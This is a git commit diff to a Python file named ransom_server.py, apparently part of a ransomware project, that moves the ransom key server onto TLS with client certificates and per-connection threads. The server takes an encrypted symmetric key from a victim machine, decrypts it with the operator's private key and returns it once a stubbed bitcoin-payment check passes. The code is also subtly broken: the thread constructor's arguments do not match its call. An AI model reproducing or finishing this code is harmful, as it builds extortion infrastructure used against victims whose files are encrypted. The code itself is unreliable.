d8006af6bc704ca4246cb6be454b225d444d1b7f
Cody Clark <cody.t.clark@gmail.com>
2022-03-10 17:33:12 -0700

    Ransom server features TLS and multithreading

--- ransom_server.py
+++ ransom_server.py
@@ -4,20 +4,25 @@ from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
+import socket
+import ssl
+import threading
 
-class ClientHandler(socketserver.BaseRequestHandler):
+class ClientThread(threading.Thread):
 
-    private_key_path = ""
-
-    def bitcoin_received() -> bool:
-        print("Check bitcoin")
-        return True
+    def __init__(self, conn, ip, port) -> None:
+        threading.Thread.__init__(self)
+        self.conn = conn
+        self.ip = ip
+        self.port = port
+        print("[+] New server socket threat started for {}:{}".format(ip, str(port)))
     
-    def handle(self):
-        encrypted_key = (self.request.recv(1024).strip()).decode()
-        print ("Decrypting " + encrypted_key )
+    # Runs when the thread is called to start
+    def run(self):
+        encrypted_key = (self.conn.recv(4096)).decode()
+        print("Decrypting " + encrypted_key )
 
-        with open(self.private_key_path, "rb") as key_file:
+        with open(private_key_path, "rb") as key_file:
             private_key = serialization.load_pem_private_key(
                 key_file.read(),
                 password=None
@@ -33,12 +38,39 @@ class ClientHandler(socketserver.BaseRequestHandler):
         )
 
         if self.bitcoin_received():
-            self.request.sendall(str.encode(decrypted_symmetric_key))
+            self.conn.send(decrypted_symmetric_key.encode())
+    
+    
+    # Some pseudocode to check if the ransom has been received
+    def bitcoin_received() -> bool:
+        print("Check bitcoin")
+        return True
 
 if __name__ == "__main__":
-    HOST, PORT = "", 8000
-    tcpServer = socketserver.TCPServer((HOST, PORT), ClientHandler)
-    try:
-        tcpServer.serve_forever()
-    except:
-        print("There was an error")
+    
+    private_key_path = "" # For symmetric private key
+    client_cert = 'path/to/client.crt'
+    server_key = 'path/to/server.key'
+    server_cert = 'path/to/server.crt'
+    port = 8080
+
+    # Create the SSL wrapper
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.verify_mode = ssl.CERT_REQUIRED
+    context.load_verify_locations(cafile=client_cert)
+    context.load_cert_chain(certfile=server_cert, keyfile=server_key)
+    context.options |= ssl.OP_SINGLE_ECDH_USE
+    context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
+        sock.bind(('', port))
+        sock.listen(5) # 5 Backlog requests
+
+        with context.wrap_socket(sock, server_side=True) as ssock:
+            while True:
+                conn, addr = ssock.accept()
+                print(addr)
+                handlerThread = ClientThread(conn, addr)
+                handlerThread.start()
+
+    
